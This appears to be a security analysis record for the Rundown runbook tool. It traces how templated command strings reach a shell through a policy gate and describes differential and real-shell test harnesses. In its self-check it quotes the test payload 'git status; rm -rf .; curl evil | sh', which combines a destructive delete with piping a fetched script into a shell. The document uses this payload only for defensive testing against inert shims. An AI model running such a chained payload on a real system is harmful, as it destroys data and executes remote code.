# Command-Execution Seam: Security Analysis

This document records a security analysis of Rundown's command-execution path —
the route by which a runbook's command text reaches a spawned shell — and the
regression tests that pin its safety properties. It is a non-normative analysis
record. The normative policy contract lives in
[docs/reference/security.md](../reference/security.md).

- **Date:** 2026-06-14
- **Scope:** `@rundown-org/core` policy + executor, `@rundown-org/cli` execution service.
- **Method:** Trailmark structural analysis (call graph, blast radius, taint) followed by manual data-flow tracing and three independent test harnesses.

---

## 1. Summary

Runbook command strings are executed by handing the fully-rendered command to
`spawn('sh', ['-c', command])`. Before the spawn, each command is gated by a
single policy check, `PolicyEvaluator.checkCommand`. The analysis set out to
answer one question: **can untrusted input reach the shell without passing, or
while subverting, that gate?**

Findings:

1. The gate is a **single, correctly-placed chokepoint** with no time-of-check /
   time-of-use (TOCTOU) window — the exact string that is checked is the exact
   string that is spawned.
2. The one residual risk class is a **parser/shell divergence**: the policy
   tokenizer (`tokenize`, the highest-complexity function in the codebase) must
   enumerate the same command heads that `sh -c` would actually execute. A
   disagreement would let an allowed command smuggle a denied one via shell
   composition.
3. **No divergence or bypass was found.** The risk is now pinned by three
   independent test harnesses (static differential, architectural invariant,
   real-shell exec tracing).

Automated taint analysis alone **cannot** see this path: it crosses an XState
event boundary and a dependency-injection seam, neither of which is a static
call edge. This is a deliberate consequence of the architecture, not a defect —
see §3.

---

## 2. The data-flow seam

The command string flows from runbook source to `spawn` through five hops that
cross two package boundaries and two non-call-edge boundaries:

```text
runbook command text  ──┐
 currentStep.command.code │  (parsed from markdown — author-controlled)
                          ├─► expandLoopVariablesForCommand()        [cli execution.ts]
template variables  ──────┘     = expandedCommandCode   ◄── RENDER POINT
 mergeEffectiveVars(...)            untrusted values interpolated here
 (--input / --input-file /          via Handlebars {{ }}
  RD_INPUT_* / config / file: /
  delegation inheritance)
                          │
                          ▼  sendAndSync({type:'EXECUTE_COMMAND', command, ...})
                          │  ═══ XState event boundary (data, not a call)
                          ▼
 buildCommandExecutionInput → CommandExecutionInput.command          [core compiler.ts]
                          │  ═══ invoke.input closure binds the CLI-supplied runner (DI)
                          ▼
 commandExecActor → CommandRunnerInput.command                       [core command-exec-actor.ts]
                          │  ═══ DI seam: runExternalCommand is a closure-bound callable
                          ▼
 createCliCommandServices.runExternalCommand → executeCommandWithPolicyCheck  [cli execution.ts]
                          │
                          ▼
 isPolicyEnforced()? ──no──► executeCommand / executeCommandWithEnv  (no gate, no sandbox)
                     └─yes─► executeCommandWithPolicy                [core executor.ts]
                          │
                          ▼
 evaluator.checkCommand(command)   ◄══ THE GATE (single chokepoint)
        allowed → OS sandbox (Landlock / Seatbelt) or executeCommandWithEnv
        denied  → { policyDenied: true, exitCode: 126 }
                          │
                          ▼
 spawn('sh', ['-c', command])      ◄══ whole rendered string → shell
```

Key source locations:

| Stage | Location |
|-------|----------|
| Template render | `packages/cli/src/services/execution.ts` (`expandLoopVariablesForCommand`) |
| Event dispatch | `packages/cli/src/services/execution.ts` (`EXECUTE_COMMAND`) |
| Actor input build | `packages/core/src/runbook/compiler.ts` (`buildCommandExecutionInput`) |
| DI seam | `packages/core/src/runbook/actors/command-exec-actor.ts` (`CommandRunnerInput`) |
| CLI runner | `packages/cli/src/services/execution.ts` (`executeCommandWithPolicyCheck`) |
| The gate | `packages/core/src/runbook/executor.ts` (`executeCommandWithPolicy` → `evaluator.checkCommand`) |
| The spawn | `packages/core/src/runbook/executor.ts` (`executeCommand` / `executeCommandWithEnv`) |
| Tokenizer | `packages/core/src/policy/parser.ts` (`tokenize`) |

---

## 3. Why automated taint analysis is blind here

A Trailmark structural pass over the repository reports **zero** untrusted-input
paths reaching any `spawn`/`exec` sink, and zero tainted ancestors on every
command-execution sink. That result is misleading if read as "input never
reaches the shell" — it does. The call graph cannot model the path because two
of its hops are not call edges:

- The rendered command crosses into the state machine as an **`EXECUTE_COMMAND`
  event payload** (data, not a function call).
- The command runner is a **dependency-injected callable** bound in the
  `invoke.input` closure at machine-construction time, not a statically
  resolvable reference.

Both are mandated by the architecture (a Category C side effect — "machine-owned
with DI callable") and by the rule that *persisted context contains only data;
runtime references flow through invoke-input closures*. The decoupling is
intentional and sound; it simply means **static taint tooling under-reports this
surface, and manual tracing plus runtime tests are required** to reason about
it. That gap is the motivation for the harnesses in §5.

---

## 4. Safety properties of the gate

The trace establishes the following properties, each now pinned by a test
(§5.2):

1. **Single chokepoint.** Every enforced path reaches `spawn` only through
   `executeCommandWithPolicy`, which calls `evaluator.checkCommand` first.
2. **No TOCTOU.** The command is passed by value through every hop; the string
   handed to `checkCommand` is byte-identical to the string handed to `spawn`.
   Injected template content is therefore subject to policy — nothing is
   re-rendered or mutated between check and execution.
3. **Fail-closed sandbox.** When OS sandboxing is enabled but unavailable and
   `sandboxStrict` is not explicitly disabled, the command is *denied* (exit
   126), not run unconfined (CWE-636 fail-safe).
4. **One explicit bypass.** The only un-gated path is the absence of a policy
   evaluator — `--allow-all` / `!isPolicyEnforced()` — which is the documented
   trust mode. A present-but-denying evaluator is never downgraded into the
   trust path.

The residual risk is **not** a missing gate. It is the soundness of the
tokenizer's executable enumeration relative to real shell semantics: the whole
rendered string is interpreted by `sh -c`, so the gate must account for every
command head the shell would run, including those introduced by `;`, `&&`,
`||`, `|`, `$(...)`, backticks, and newlines.

---

## 5. Regression coverage

The seam is pinned three independent ways. All tests live in the
`@rundown-org/core` and `@rundown-org/cli` packages.

### 5.1 Static differential — tokenizer vs. `shell-quote`

`packages/core/__tests__/policy/tokenize-shell-differential.properties.test.ts`

A `fast-check` property test compares the policy parser against a `shell-quote`
based reference for shell semantics. **Oracle:** for any command the policy
marks allowed, every command head `shell-quote` resolves (splitting on shell
operators and recursing into substitutions) must be in the allowed set. Includes
an anti-vacuity guard asserting a meaningful fraction of generated inputs are
actually allowed, so the property cannot pass trivially on all-denied inputs.

### 5.2 Architectural invariant — the gate cannot be bypassed

`packages/core/__tests__/runbook/executor-policy-gate.invariant.test.ts`
`packages/cli/__tests__/services/execution-policy-gate.invariant.test.ts`

Unit tests that spy on `spawn` and assert the §4 properties: deny ⇒ no spawn;
allow ⇒ spawn reached with a byte-identical string; sandbox-unavailable ⇒
fail-closed; no-evaluator is the only un-gated path; and (CLI layer) enforcement
on routes through the gate while enforcement off uses the explicit trust path.
Each assertion was confirmed to have teeth by temporarily mutating the
corresponding production branch.

### 5.3 Real-shell exec tracing — ground truth

`packages/core/__tests__/policy/tokenize-shell-exec-differential.integration.test.ts`

The static reference in §5.1 is only an approximation of POSIX `sh`; a bug shared
by both the policy parser and `shell-quote` would be invisible to it. This
integration harness removes the approximation by running `sh -c <command>` for
real and capturing **which command heads actually execute**, via inert PATH
tracer shims. **Oracle:** every head the real shell executes under a
policy-allowed command must be in the allowed set.

It is destructive-proof by construction:

- Inert shims only — every command name (including `rm`, `curl`, `sudo`) is a
  script that logs its own name and exits 0.
- Hermetic environment — the shell runs with an empty environment and `PATH`
  pointing only at the shim directory, so bare names resolve exclusively to
  shims.
- Generators emit bare command names only (never absolute paths); a throwaway
  `mkdtemp` cwd, a SIGKILL timeout, and no stdin bound every run.

An in-suite self-check encodes the safety proof: the canonical payload
`git status; rm -rf .; curl evil | sh` traces exactly `{git, rm, curl, sh}` to
inert shims while a sentinel outside the temp directory survives untouched.

### Running the suites

```bash
# Static differential + the core gate invariant
npm run test -w packages/core

# CLI gate invariant
npm run test -w packages/cli

# Just the real-shell exec-tracing harness
npm run test -w packages/core -- --testPathPatterns 'exec-differential'
```

The exec-tracing harness spawns real processes and is named
`*.integration.test.ts`; it runs as part of the core suite and skips
automatically on platforms without `/bin/sh`.

---

## 6. Result and residual gaps

No bypass or parser/shell divergence was found across all three harnesses. The
policy gate is correctly placed, free of a TOCTOU window, fail-closed on
sandbox unavailability, and its tokenizer's executable enumeration is sound
against real-shell ground truth for the vocabularies tested.

"No bug found" is not "proven safe." Known residual gaps, in priority order:

1. **Finite shim vocabulary.** The exec-tracing oracle observes only command
   names it has shimmed; a smuggled head whose name is outside the vocabulary
   leaves no trace. A catch-all fallback shim would close this.
2. **Builtins are out of scope.** Ground truth is PATH-resolution exec, so shell
   builtins that do not fork an external program (`eval`, `.`/`source`,
   `command`) are not directly observed. An external program reached *through* a
   builtin (e.g. `eval "curl …"`) is still caught.
3. **Path-shaped heads are not fuzzed** (a deliberate safety constraint of the
   generator).
4. **Platform coverage.** The integration harness has been validated on macOS
   only; it is POSIX-portable and skips on Windows / when `/bin/sh` is absent,
   but warrants one Linux CI confirmation run.

These are tracked as follow-ups; none represents a known exploitable weakness in
the current gate.
